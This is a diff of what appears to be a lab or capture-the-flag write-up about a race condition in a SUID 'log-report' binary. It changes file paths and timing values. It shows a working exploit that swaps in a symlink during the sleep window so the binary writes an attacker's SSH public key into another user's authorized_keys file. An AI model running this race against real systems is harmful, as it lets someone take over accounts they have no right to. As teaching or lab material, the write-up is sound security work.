@@ -171,12 +171,12 @@ The binary is SUID and owned by sarah. Running it:
 The binary logic:
 
 ```c
-// 1. lstat() — checks if /tmp/.report_out is a symlink → exits if yes
+// 1. lstat() — checks if /home/jonny/.report_out is a symlink → exits if yes
 // 2. unlink() — removes it if it's a regular file
-// 3. fopen(INPUT_PATH, "r")  — reads /tmp/.report_in
+// 3. fopen(INPUT_PATH, "r")  — reads /home/jonny/.report_in
 // 4. printf("archiving...")
-// 5. sleep(2)                 ← RACE WINDOW
-// 6. fopen(OUTPUT_PATH, "w") — opens /tmp/.report_out as effective UID=sarah
+// 5. sleep(30)                ← RACE WINDOW
+// 6. fopen(OUTPUT_PATH, "w") — opens /home/jonny/.report_out as effective UID=sarah
 // 7. copy input → output
 ```
 
@@ -193,11 +193,11 @@ ssh-keygen -t ed25519 -f /tmp/attacker_key -N ""
 Run the race:
 
 ```bash
-echo "$(cat /tmp/attacker_key.pub)" > /tmp/.report_in
-rm -f /tmp/.report_out
+echo "$(cat /tmp/attacker_key.pub)" > /home/jonny/.report_in
+rm -f /home/jonny/.report_out
 /usr/local/bin/log-report &
-sleep 0.4
-ln -sf /home/sarah/.ssh/authorized_keys /tmp/.report_out
+sleep 1
+ln -sf /home/sarah/.ssh/authorized_keys /home/jonny/.report_out
 wait
 ```
 
